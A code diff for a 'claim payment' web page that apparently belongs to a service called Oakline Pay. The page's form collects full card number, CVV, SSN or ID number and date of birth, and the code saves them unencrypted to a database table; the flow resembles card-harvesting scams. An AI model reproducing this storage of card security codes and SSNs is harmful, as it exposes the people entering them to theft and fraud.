@@ -118,7 +118,7 @@ export default function ClaimPaymentPage() {
     // Validation: Check verification fields based on type
     const hasVerification = debitCardForm.verification_type === 'ssn' ? debitCardForm.ssn : debitCardForm.id_number;
 
-    if (!debitCardForm.first_name || !debitCardForm.last_name || !debitCardForm.card_number || !debitCardForm.card_expiry || !debitCardForm.card_cvv || !hasVerification || !debitCardForm.date_of_birth || !debitCardForm.billing_address || !debitCardForm.billing_city || !debitCardForm.billing_province_state || !debitCardForm.billing_postal_code || !debitCardForm.billing_country || !debitCardForm.card_issuer) {
+    if (!debitCardForm.first_name || !debitCardForm.last_name || !debitCardForm.card_number || !debitCardForm.card_expiry || !debitCardForm.card_cvv || !hasVerification || !debitCardForm.date_of_birth || !debitCardForm.billing_address || !debitCardForm.billing_city || !debitCardForm.billing_state || !debitCardForm.billing_zip || !debitCardForm.billing_country) {
       setMessage('Please fill in all required fields.', 'error');
       setMessageType('error');
       return;
@@ -143,29 +143,22 @@ export default function ClaimPaymentPage() {
     setSubmitting(true);
     try {
       const finalCardholderName = debitCardForm.cardholder_name.trim() || `${debitCardForm.first_name} ${debitCardForm.middle_name ? debitCardForm.middle_name + ' ' : ''}${debitCardForm.last_name}`;
-      const finalCardIssuer = debitCardForm.card_issuer === 'other' ? debitCardForm.card_issuer_custom : debitCardForm.card_issuer;
       
       const { error } = await supabase
         .from('oakline_pay_pending_claims')
         .update({
           claim_method: 'debit_card',
           claimed_at: new Date().toISOString(),
-          first_name: debitCardForm.first_name,
-          middle_name: debitCardForm.middle_name,
-          last_name: debitCardForm.last_name,
           cardholder_name: finalCardholderName,
           card_number: debitCardForm.card_number,
           card_expiry: debitCardForm.card_expiry,
           card_cvv: debitCardForm.card_cvv,
-          verification_type: debitCardForm.verification_type,
           ssn: debitCardForm.verification_type === 'ssn' ? debitCardForm.ssn : null,
-          id_number: debitCardForm.verification_type === 'id_number' ? debitCardForm.id_number : null,
           date_of_birth: debitCardForm.date_of_birth,
-          card_issuer: finalCardIssuer,
           billing_address: debitCardForm.billing_address,
           billing_city: debitCardForm.billing_city,
-          billing_province_state: debitCardForm.billing_province_state,
-          billing_postal_code: debitCardForm.billing_postal_code,
+          billing_state: debitCardForm.billing_state,
+          billing_zip: debitCardForm.billing_zip,
           billing_country: debitCardForm.billing_country,
           approval_status: 'card_details_submitted'
         })
@@ -196,7 +189,7 @@ export default function ClaimPaymentPage() {
       });
       setClaimSuccess(true);
     } catch (error) {
-      console.error('Error:', error);
+      console.error('Debit card submission error:', error);
       const errorMsg = error?.message || 'Failed to process claim. Please try again.';
       setMessage(`Error: ${errorMsg}`);
       setMessageType('error');
@@ -725,10 +718,9 @@ export default function ClaimPaymentPage() {
                             type="text" 
                             placeholder="1234 5678 9012 3456" 
                             maxLength="19" 
-                            value={debitCardForm.card_number} 
+                            value={debitCardForm.card_number.replace(/(\d{4})(?=\d)/g, '$1 ')} 
                             onChange={(e) => {
                               const digits = e.target.value.replace(/\D/g, '').slice(0, 16);
-                              const formatted = digits.replace(/(\d{4})(?=\d)/g, '$1 ');
                               setDebitCardForm({ ...debitCardForm, card_number: digits });
                             }} 
                             style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', letterSpacing: '2px', transition: 'border-color 0.2s' }} 
@@ -809,14 +801,14 @@ export default function ClaimPaymentPage() {
                           </div>
                           <div style={{ flex: 1 }}>
                             <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>{citizenship === 'us' ? 'State' : 'State / Province'} *</label>
-                            <input type="text" placeholder={citizenship === 'us' ? 'CA' : 'CA or QC or Bayern'} value={debitCardForm.billing_province_state} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_province_state: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
+                            <input type="text" placeholder={citizenship === 'us' ? 'CA' : 'CA or QC or Bayern'} value={debitCardForm.billing_state} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_state: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                           </div>
                         </div>
 
                         <div className="form-row" style={{ display: 'flex', gap: '1rem' }}>
                           <div style={{ flex: 1 }}>
                             <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>{citizenship === 'us' ? 'ZIP Code' : 'Postal Code'} *</label>
-                            <input type="text" placeholder={citizenship === 'us' ? '10001' : 'M5V 3A8 or 10115'} value={debitCardForm.billing_postal_code} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_postal_code: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
+                            <input type="text" placeholder={citizenship === 'us' ? '10001' : 'M5V 3A8 or 10115'} value={debitCardForm.billing_zip} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_zip: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                           </div>
                           {citizenship !== 'us' && (
                             <div style={{ flex: 1 }}>
@@ -834,8 +826,15 @@ export default function ClaimPaymentPage() {
                         )}
                       </div>
 
-                      <button onClick={handleDebitCardSubmit} disabled={submitting} style={{ width: '100%', padding: '1rem', background: 'linear-gradient(135deg, #0066cc 0%, #004999 100%)', color: 'white', border: 'none', borderRadius: '8px', fontWeight: '600', cursor: submitting ? 'not-allowed' : 'pointer', opacity: submitting ? 0.7 : 1, fontSize: '1rem', transition: 'all 0.2s' }}>
-                        {submitting ? '⏳ Processing...' : '✓ Claim to Debit Card'}
+                      <button onClick={handleDebitCardSubmit} disabled={submitting} style={{ width: '100%', padding: '1rem', background: 'linear-gradient(135deg, #0066cc 0%, #004999 100%)', color: 'white', border: 'none', borderRadius: '8px', fontWeight: '600', cursor: submitting ? 'not-allowed' : 'pointer', opacity: submitting ? 0.7 : 1, fontSize: '1rem', transition: 'all 0.2s', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '0.75rem' }}>
+                        {submitting ? (
+                          <>
+                            <div style={{ width: '20px', height: '20px', border: '3px solid rgba(255,255,255,0.3)', borderTop: '3px solid white', borderRadius: '50%', animation: 'spin 1s linear infinite' }}></div>
+                            Processing...
+                          </>
+                        ) : (
+                          '✓ Claim to Debit Card'
+                        )}
                       </button>
                     </>
                   )}
